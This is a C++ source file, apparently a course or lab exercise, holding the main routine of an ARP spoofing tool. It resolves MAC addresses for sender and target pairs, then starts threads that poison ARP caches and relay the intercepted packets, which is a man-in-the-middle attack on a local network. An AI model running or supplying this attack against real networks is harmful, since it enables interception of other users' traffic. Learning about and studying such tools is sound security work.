#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <string>
#include <pthread.h>
#include <iostream>
#include "arp-spoof.h"

Mac myMac;
Ip myIp;
pcap_t* pcap;
std::vector<SpoofPair> spoofpairs;

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    const char* dev = argv[1];
    if (!getMyInfo(dev)) return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        std::cerr << "[-] Couldn't open device: " << errbuf << std::endl;
        return -1;
    }

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);
        Mac senderMac, targetMac;

        if (!getMac(pcap, senderMac, senderIp)) continue;
        if (!getMac(pcap, targetMac, targetIp)) continue;

        spoofpairs.push_back({senderIp, targetIp, senderMac, targetMac});
    }

    for (const auto& pair : spoofpairs) {
        FlowContext* ctx = new FlowContext{ pair, pcap };
        pthread_t tid;
        pthread_create(&tid, nullptr, spoofThread, ctx);
    }

    pthread_t relayTid;
    pthread_create(&relayTid, nullptr, relayThread, nullptr);
    pthread_join(relayTid, nullptr);
    pcap_close(pcap);
    return 0;
}

